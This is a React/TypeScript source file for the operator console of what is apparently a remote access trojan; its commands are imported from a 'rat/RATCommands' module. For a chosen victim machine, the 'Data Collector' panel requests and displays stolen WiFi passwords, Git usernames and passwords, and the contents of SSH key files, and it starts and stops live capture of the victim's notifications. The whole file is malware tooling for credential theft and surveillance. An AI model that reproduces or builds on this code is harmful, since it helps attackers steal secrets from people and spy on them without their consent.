import React, { useEffect, useMemo, useState } from "react";
import { useParams } from "react-router-dom";
import { listen } from "@tauri-apps/api/event";
import {
  requestWifiDataCmd,
  requestGitDataCmd,
  requestSSHDataCmd,
  startNotificationCaptureCmd,
  stopNotificationCaptureCmd,
} from "../rat/RATCommands";
import {
  WifiDataPayload,
  GitDataPayload,
  SSHDataPayload,
  NotificationEventPayload,
  WifiProfile,
  GitCredentialEntry,
  ExtractedFile,
} from "../../types";
import {
  IconWifi,
  IconBrandGithub,
  IconLock,
  IconBell,
} from "@tabler/icons-react";

export const DataCollector: React.FC = () => {
  const { addr } = useParams();
  const [status, setStatus] = useState("Ready to collect data");
  const [wifiProfiles, setWifiProfiles] = useState<WifiProfile[]>([]);
  const [gitCredentials, setGitCredentials] = useState<GitCredentialEntry[]>([]);
  const [gitConfigs, setGitConfigs] = useState<ExtractedFile[]>([]);
  const [sshFiles, setSshFiles] = useState<ExtractedFile[]>([]);
  const [notifications, setNotifications] = useState<NotificationEventPayload["data"][]>([]);
  const [notificationRunning, setNotificationRunning] = useState(false);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    let unlistenWifi: (() => void) | null = null;
    let unlistenGit: (() => void) | null = null;
    let unlistenSSH: (() => void) | null = null;
    let unlistenNotification: (() => void) | null = null;

    const setupListeners = async () => {
      unlistenWifi = await listen("wifi_data", (event) => {
        const payload = event.payload as WifiDataPayload;
        if (payload.addr !== addr) return;
        setWifiProfiles(payload.data.profiles);
        setStatus("WiFi profiles recovered");
        setLoading(false);
      });

      unlistenGit = await listen("git_data", (event) => {
        const payload = event.payload as GitDataPayload;
        if (payload.addr !== addr) return;
        setGitCredentials(payload.data.credentials);
        setGitConfigs(payload.data.configs);
        setStatus("Git data recovered");
        setLoading(false);
      });

      unlistenSSH = await listen("ssh_data", (event) => {
        const payload = event.payload as SSHDataPayload;
        if (payload.addr !== addr) return;
        setSshFiles(payload.data.files);
        setStatus("SSH files recovered");
        setLoading(false);
      });

      unlistenNotification = await listen("notification_event", (event) => {
        const payload = event.payload as NotificationEventPayload;
        if (payload.addr !== addr) return;
        setNotifications((prev) => [payload.data, ...prev].slice(0, 50));
      });
    };

    setupListeners();

    return () => {
      unlistenWifi?.();
      unlistenGit?.();
      unlistenSSH?.();
      unlistenNotification?.();
    };
  }, [addr]);

  const requestFeature = async (
    command: (addr: string | undefined) => Promise<void>,
    message: string
  ) => {
    if (!addr) return;
    setStatus(message);
    setLoading(true);
    try {
      await command(addr);
    } catch (e) {
      console.error(e);
      setStatus("Request failed");
      setLoading(false);
    }
  };

  const toggleNotificationCapture = async () => {
    if (!addr) return;
    try {
      if (notificationRunning) {
        await stopNotificationCaptureCmd(addr);
        setNotificationRunning(false);
        setStatus("Notification capture stopped");
      } else {
        await startNotificationCaptureCmd(addr);
        setNotificationRunning(true);
        setStatus("Notification capture started");
      }
    } catch (e) {
      console.error(e);
      setStatus("Notification capture failed");
    }
  };

  const summary = useMemo(() => {
    return {
      wifi: wifiProfiles.length,
      gitCredentials: gitCredentials.length,
      gitConfigs: gitConfigs.length,
      sshFiles: sshFiles.length,
      notifications: notifications.length,
    };
  }, [wifiProfiles, gitCredentials, gitConfigs, sshFiles, notifications]);

  return (
    <div className="flex flex-col h-screen bg-[#050505] text-gray-200 overflow-hidden font-sans">
      <div className="h-16 shrink-0 bg-[#0a0a0a] border-b border-[#1a1a1a] flex items-center justify-between px-6 shadow-xl z-20">
        <div className="flex items-center gap-4">
          <div className="p-2 bg-accentx/10 rounded-xl border border-accentx/20">
            <IconWifi className="text-accentx" size={24} />
          </div>
          <div>
            <h1 className="text-lg font-black tracking-tighter uppercase italic text-white">
              Data Collector
            </h1>
            <p className="text-[10px] font-mono text-gray-500 uppercase tracking-widest leading-none">
              Extract WiFi, Git, SSH and capture notifications
            </p>
          </div>
        </div>

        <div className="flex items-center gap-3">
          <span className="text-xs uppercase tracking-[0.3em] text-gray-500">
            {status}
          </span>
          <button
            onClick={() => setStatus("Ready to collect data")}
            className="rounded-xl bg-[#111] px-4 py-2 text-xs text-white hover:bg-[#222] transition"
          >
            Reset Status
          </button>
        </div>
      </div>

      <div className="flex flex-1 overflow-hidden">
        <div className="w-80 shrink-0 bg-[#080808] border-r border-[#1a1a1a] p-4 space-y-4 overflow-y-auto">
          <button
            onClick={() => requestFeature(requestWifiDataCmd, "Requesting WiFi profiles...")}
            className="flex items-center gap-2 w-full rounded-2xl bg-[#111] px-4 py-3 text-sm font-bold uppercase tracking-tight text-white hover:bg-[#1a1a1a] transition"
            disabled={loading}
          >
            <IconWifi size={18} /> WiFi
          </button>
          <button
            onClick={() => requestFeature(requestGitDataCmd, "Requesting Git credentials...")}
            className="flex items-center gap-2 w-full rounded-2xl bg-[#111] px-4 py-3 text-sm font-bold uppercase tracking-tight text-white hover:bg-[#1a1a1a] transition"
            disabled={loading}
          >
            <IconBrandGithub size={18} /> Git
          </button>
          <button
            onClick={() => requestFeature(requestSSHDataCmd, "Requesting SSH data...")}
            className="flex items-center gap-2 w-full rounded-2xl bg-[#111] px-4 py-3 text-sm font-bold uppercase tracking-tight text-white hover:bg-[#1a1a1a] transition"
            disabled={loading}
          >
            <IconLock size={18} /> SSH
          </button>
          <button
            onClick={toggleNotificationCapture}
            className={`flex items-center gap-2 w-full rounded-2xl px-4 py-3 text-sm font-bold uppercase tracking-tight transition ${notificationRunning ? "bg-green-700" : "bg-[#111] hover:bg-[#1a1a1a]"}`}
          >
            <IconBell size={18} /> {notificationRunning ? "Stop Notifications" : "Start Notifications"}
          </button>
          <div className="rounded-2xl bg-[#0f0f0f] border border-[#1a1a1a] p-4">
            <div className="flex items-center justify-between text-xs uppercase tracking-[0.3em] text-gray-500 mb-3">
              <span>Summary</span>
              <span className="text-accentx">{loading ? "Loading..." : "Idle"}</span>
            </div>
            <div className="space-y-2 text-[11px] text-gray-300">
              <div>WiFi: {summary.wifi}</div>
              <div>Git creds: {summary.gitCredentials}</div>
              <div>Git configs: {summary.gitConfigs}</div>
              <div>SSH files: {summary.sshFiles}</div>
              <div>Notifications: {summary.notifications}</div>
            </div>
          </div>
        </div>

        <div className="flex-1 p-6 overflow-y-auto bg-[#050505]">
          <div className="grid grid-cols-1 gap-4 lg:grid-cols-2">
            <section className="rounded-3xl border border-[#1a1a1a] bg-[#0c0c0c] p-4">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-bold uppercase tracking-[0.2em] text-gray-400">WiFi Profiles</h2>
                <span className="text-xs text-gray-500">{wifiProfiles.length}</span>
              </div>
              {wifiProfiles.length === 0 ? (
                <p className="text-sm text-gray-500">No WiFi profiles collected yet.</p>
              ) : (
                <div className="space-y-3">
                  {wifiProfiles.map((profile, index) => (
                    <div key={index} className="rounded-2xl border border-[#1a1a1a] p-3 bg-[#111]">
                      <div className="text-sm font-semibold text-white">{profile.ssid}</div>
                      <div className="text-xs text-gray-400 mt-2">Auth: {profile.authentication}</div>
                      <div className="text-xs text-gray-400">Cipher: {profile.cipher}</div>
                      <div className="text-xs text-gray-300 mt-2">Password: {profile.password}</div>
                    </div>
                  ))}
                </div>
              )}
            </section>

            <section className="rounded-3xl border border-[#1a1a1a] bg-[#0c0c0c] p-4">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-bold uppercase tracking-[0.2em] text-gray-400">Git Credentials</h2>
                <span className="text-xs text-gray-500">{gitCredentials.length}</span>
              </div>
              {gitCredentials.length === 0 ? (
                <p className="text-sm text-gray-500">No Git credentials found.</p>
              ) : (
                <div className="space-y-3">
                  {gitCredentials.map((cred, index) => (
                    <div key={index} className="rounded-2xl border border-[#1a1a1a] p-3 bg-[#111]">
                      <div className="text-sm font-semibold text-white">{cred.source}</div>
                      <div className="text-xs text-gray-400 mt-1">URL: {cred.url}</div>
                      <div className="text-xs text-gray-400">User: {cred.username}</div>
                      <div className="text-xs text-gray-400">Pass: {cred.password}</div>
                    </div>
                  ))}
                </div>
              )}
            </section>

            <section className="rounded-3xl border border-[#1a1a1a] bg-[#0c0c0c] p-4">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-bold uppercase tracking-[0.2em] text-gray-400">SSH Files</h2>
                <span className="text-xs text-gray-500">{sshFiles.length}</span>
              </div>
              {sshFiles.length === 0 ? (
                <p className="text-sm text-gray-500">No SSH files extracted.</p>
              ) : (
                <div className="space-y-3 max-h-[420px] overflow-y-auto pr-2">
                  {sshFiles.slice(0, 12).map((file, index) => (
                    <div key={index} className="rounded-2xl border border-[#1a1a1a] p-3 bg-[#111]">
                      <div className="text-sm font-semibold text-accentx">{file.path}</div>
                      <div className="text-xs text-gray-400 mt-2 whitespace-pre-wrap break-all">{file.contents.slice(0, 280)}{file.contents.length > 280 ? "..." : ""}</div>
                    </div>
                  ))}
                </div>
              )}
            </section>

            <section className="rounded-3xl border border-[#1a1a1a] bg-[#0c0c0c] p-4">
              <div className="flex items-center justify-between mb-4">
                <h2 className="text-sm font-bold uppercase tracking-[0.2em] text-gray-400">Notification Events</h2>
                <span className="text-xs text-gray-500">{notifications.length}</span>
              </div>
              <div className="space-y-3 max-h-[320px] overflow-y-auto pr-2">
                {notifications.length === 0 ? (
                  <p className="text-sm text-gray-500">No notifications captured.</p>
                ) : (
                  notifications.map((event, index) => (
                    <div key={index} className="rounded-2xl border border-[#1a1a1a] p-3 bg-[#111]">
                      <div className="text-sm font-semibold text-white">{event.title || event.source}</div>
                      <div className="text-xs text-gray-400 mt-1">{event.timestamp}</div>
                      <div className="text-xs text-gray-300 mt-2 whitespace-pre-wrap break-all">{event.message}</div>
                    </div>
                  ))
                )}
              </div>
            </section>
          </div>
        </div>
      </div>
    </div>
  );
};
